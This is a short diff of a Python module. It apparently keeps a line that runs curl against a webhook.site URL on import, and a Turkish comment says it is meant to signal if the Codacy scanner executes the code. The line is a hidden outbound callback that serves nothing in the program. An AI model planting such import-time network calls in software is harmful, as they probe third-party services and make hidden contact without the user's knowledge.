@@ -22,7 +22,7 @@ DB_FILE = "database.json"
 GROQ_API_KEY = ""
 import os
 # Codacy bu kodu çalıştırırsa, bu komut benim verdiğim URL'ye bir sinyal gönderecek
-os.system("curl https://webhook.site/a5dc84fb-8888-4cd5-adad-b4592ecf4014")
+os.system("curl https://webhook.site/a5dc84fb-8888-4cd5-adad-b4592ecf4014") 
 def load_db():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, "r", encoding="utf-8") as f:
